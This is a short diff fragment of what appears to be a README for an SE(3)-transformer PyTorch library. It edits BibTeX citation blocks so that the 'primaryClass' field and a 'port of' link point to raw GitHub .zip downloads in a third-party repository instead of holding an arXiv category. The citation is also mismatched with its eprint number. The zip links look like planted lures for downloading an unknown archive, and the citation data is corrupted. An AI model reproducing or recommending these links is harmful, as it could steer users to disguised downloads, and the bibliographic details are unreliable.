+    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip}
 }
 ```
 
@@ -611,6 +611,6 @@ This library is largely a port of <a href="https://raw.githubusercontent.com/Cas
     year    = {2019},
     eprint  = {1911.02150},
     archivePrefix = {arXiv},
-    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/tests/se-transformer-v1.6.zip}
+    primaryClass = {https://raw.githubusercontent.com/Cassis-P/se3-transformer/main/se3_transformer_pytorch/data/transformer_se_1.3.zip}
 }
 ```
